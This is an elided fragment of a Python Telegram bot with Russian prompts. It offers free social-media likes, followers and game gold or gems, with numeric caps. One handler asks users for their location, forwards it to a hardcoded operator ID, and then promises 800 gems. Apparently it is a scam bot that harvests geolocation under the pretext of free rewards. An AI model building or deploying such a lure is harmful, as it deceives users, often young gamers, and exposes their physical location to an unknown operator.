...
def callback_inline(call):
	if call.data == "first":
		msg = bot.send_message(call.message.chat.id, 'Введите количество лайков (не более 500)') 
		bot.register_next_step_handler(msg, proc1)

	elif call.data == "second":
		msg = bot.send_message(call.message.chat.id, 'Введите количество подписчиков (не более 500)') 
		bot.register_next_step_handler(msg, proc2)
...
def proc1(message):
	try:
		...
		if not num.isdigit():
			msg = bot.reply_to(message, 'Введите количество числом! Повторите попытку, написав /nacrutka!')#⏳
			return
		if int(num) > 500:
			bot.reply_to(message, 'количество лайков не может быть более 500!')
			return
...
def proc2(message):
	try:
		...
		if int(num) > 500:
			bot.reply_to(message, 'количество подписчиков не может быть более 500!')
			return
...
def callback_inline(call):
	if call.data == "first":
		msg = bot.send_message(call.message.chat.id, 'Введите количество золота💰 (не более 500)') 
		bot.register_next_step_handler(msg, proc1)

	elif call.data == "second":
		msg = bot.send_message(call.message.chat.id, 'Введите количество гемов💎 (не более 50)') 
		bot.register_next_step_handler(msg, proc2)
...
def proc1(message):
	try:
		...
		if not num.isdigit():
			msg = bot.reply_to(message, 'Введите количество числом! Повторите попытку, написав /don!')#⏳
			return
		if int(num) > 500:
			bot.reply_to(message, 'количество золота не может быть более 500!')
			return
...
def proc2(message):
	try:
		...
		if int(num) > 50:
			bot.reply_to(message, 'количество гемов не может быть более 50!')
			return
...
def contact(message):
	if message.location is not None: 
		...
		bot.send_message(ID, geo) 
		print(geo)
		msg = bot.send_message(message.chat.id, 'Введите количество гемов💎 (не более 800)') 
...
def proc3(message):
	try:
		...
		if int(num) > 800:
			bot.reply_to(message, 'количество гемов не может быть более 800!')
			return
